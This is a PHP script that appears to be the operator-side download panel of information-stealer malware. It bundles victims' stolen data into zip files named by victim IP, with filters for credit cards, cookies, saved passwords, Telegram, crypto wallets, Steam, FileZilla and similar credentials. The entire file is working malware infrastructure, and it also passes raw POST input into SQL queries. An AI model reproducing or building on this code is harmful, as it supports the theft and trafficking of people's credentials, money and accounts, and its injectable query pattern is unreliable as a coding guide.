<?php
require("config.php");
require("mysql.php");
set_time_limit(0);
error_reporting(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', 0);

function generateRandomString($length = 12) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function filter($norm, $arr){
	$quest = "SELECT * FROM `users` WHERE id > -1";
	
	foreach($norm['norm'] as $n){
		if($n=='cc'){ $quest.=' && cc > 0'; $arr['cc'] = 'checked';}
		if($n=='autofill'){ $quest.=' && autofill > 0'; $arr['autofill'] = 'checked';}
		if($n=='cookies'){ $quest.=' && cookies > 0'; $arr['cookies'] = 'checked';}
		if($n=='filezilla'){ $quest.=' && filezilla > 0'; $arr['filezilla'] = 'checked';}
		if($n=='passwords'){ $quest.=' && passwords > 0'; $arr['passwords'] = 'checked';}
		if($n=='telegram'){ $quest.=' && telegram > 0'; $arr['telegram'] = 'checked';}
		if($n=='crypto'){ $quest.=' && crypto > 0'; $arr['crypto'] = 'checked';}
		if($n=='pidgin'){ $quest.=' && pidgin > 0'; $arr['pidgin'] = 'checked';}
		if($n=='psi'){ $quest.=' && psi > 0'; $arr['psi'] = 'checked';}
		if($n=='psiplus'){ $quest.=' && psiplus > 0'; $arr['psiplus'] = 'checked';}
		if($n=='steam'){ $quest.=' && steam > 0'; $arr['steam'] = 'checked';}
		if($n=='BattleNet'){ $quest.=' && BattleNet > 0'; $arr['BattleNet'] = 'checked';}
		if($n=='WINSCP'){ $quest.=' && WINSCP > 0'; $arr['WINSCP'] = 'checked';}
		if($n=='amazon'){ $quest.=' && amazon > 0'; $arr['amazon'] = 'checked';}
	}
	
	return array($quest, $arr);
}

if($_COOKIE["pwd"] === md5($panel_password)){
	
	if(isset($_POST['id'])){
		$answer = $base->query("SELECT * FROM `users` WHERE id =".$_POST['id']." LIMIT 1");
		$row = $answer->fetchAll();
		
		$zipname = $row[0]['ip'].'_'.$row[0]['id'].'_'.generateRandomString().'.zip';
		
		header('Content-type: application/zip');
		header("Content-Transfer-Encoding: Binary");
		header('Content-Disposition: attachment; filename="'.$zipname.'"');
		
		$base64en = base64_decode($row[0]['file']);
		echo $base64en;
		
		return;
	}
	
	if(isset($_POST['filter'])){
		
		$zip = new ZipArchive();
		
		$zipname = generateRandomString().'.zip';
		$zip->open($zipname, ZipArchive::CREATE);
		
		$arr = []; 
		$quest = filter($_POST, $arr)[0];
		
		$answer = $base->query($quest);
		$rows = $answer->fetchAll();
		
		foreach($rows as $row){
			$zip->addFromString($row['ip'].'_'.$row['id'].'_'.generateRandomString().'.zip', base64_decode($row['file']));
		}
		
		$zip->close();
		
		header('Content-type: application/zip');
		header("Content-Transfer-Encoding: Binary");
		header('Content-Disposition: attachment; filename="'.$zipname.'"');
		echo readfile($zipname);
		unlink($zipname);
		return;
	}
	
	if(isset($_POST['all'])){
		
		$zip = new ZipArchive();
		
		$zipname = generateRandomString().'.zip';
		$zip->open($zipname, ZipArchive::CREATE);
		
		$answer = $base->query("SELECT * FROM `users`");
		$rows = $answer->fetchAll();
		foreach($rows as $row){
			
			if(!isset($row['id'])){
				continue;
			}
			
			$zip->addFromString($row['ip'].'_'.$row['id'].'_'.generateRandomString().'.zip', base64_decode($row['file']));
		}
		
		$zip->close();
		
		header('Content-type: application/zip');
		header("Content-Transfer-Encoding: Binary");
		header('Content-Disposition: attachment; filename="'.$zipname.'"');
		echo readfile($zipname);
		unlink($zipname);
		return;
	}
}	
?>
